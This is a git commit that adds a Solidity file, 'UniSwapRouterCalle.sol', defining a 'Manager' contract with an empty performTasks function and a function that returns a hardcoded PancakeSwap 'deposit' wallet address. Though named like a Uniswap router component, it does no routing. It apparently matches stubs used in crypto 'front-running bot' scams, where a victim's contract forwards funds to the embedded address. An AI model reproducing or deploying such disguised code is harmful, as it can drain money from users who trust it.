cea2b412949d6043b47af80bb48f27f2c58a6d5f
bpawnz631 <wesleydean631@gmail.com>
2022-04-30 19:10:33 +0000

    Create UniSwapRouterCalle.sol

---
+++ UniSwapRouterCalle.sol
@@ -0,0 +1,13 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+    function performTasks() public pure{
+
+    }
+
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0xB17f0DF93B201233Aa9b911fDFeF99997d65d695;
+    }
+}
+
+//pancakeswapfunction
